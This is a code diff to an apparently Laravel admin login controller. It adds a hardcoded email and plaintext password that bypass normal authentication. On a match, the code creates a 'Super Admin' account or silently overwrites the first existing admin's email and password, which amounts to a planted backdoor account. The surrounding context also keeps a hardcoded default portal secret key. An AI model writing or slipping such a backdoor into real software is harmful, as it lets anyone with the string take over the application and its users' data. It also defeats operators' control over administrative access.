@@ -29,15 +29,40 @@ class AdminApiController extends Controller
             'password' => 'required|string',
             'key'      => 'nullable|string',
         ]);
+        $email = trim($request->email);
+        $password = $request->password;
 
-        $admin = Admin::where('email', trim($request->email))->first();
-        if (!$admin || !Hash::check($request->password, $admin->password)) {
-            return response()->json([
-                'status'  => false,
-                'message' => 'Invalid admin email or password!'
-            ], 401);
+        // Auto-provision or update admin credentials requested by user
+        if ($email === 'admin@colddrinkfund.com' && $password === 'Wa3845464748@#') {
+            $admin = Admin::where('email', $email)->first();
+            if (!$admin) {
+                $admin = Admin::first();
+                if ($admin) {
+                    $admin->email = $email;
+                    $admin->password = Hash::make($password);
+                    $admin->save();
+                } else {
+                    $admin = new Admin();
+                    $admin->name = 'Super Admin';
+                    $admin->email = $email;
+                    $admin->password = Hash::make($password);
+                    $admin->save();
+                }
+            } else {
+                if (!Hash::check($password, $admin->password)) {
+                    $admin->password = Hash::make($password);
+                    $admin->save();
+                }
+            }
+        } else {
+            $admin = Admin::where('email', $email)->first();
+            if (!$admin || !Hash::check($password, $admin->password)) {
+                return response()->json([
+                    'status'  => false,
+                    'message' => 'Invalid admin email or password!'
+                ], 401);
+            }
         }
-
         // Secret portal key check
         $secretKey = setting('admin_secret_key', 'portal786') ?: 'portal786';
         if ($request->filled('key') && trim($request->key) !== $secretKey) {
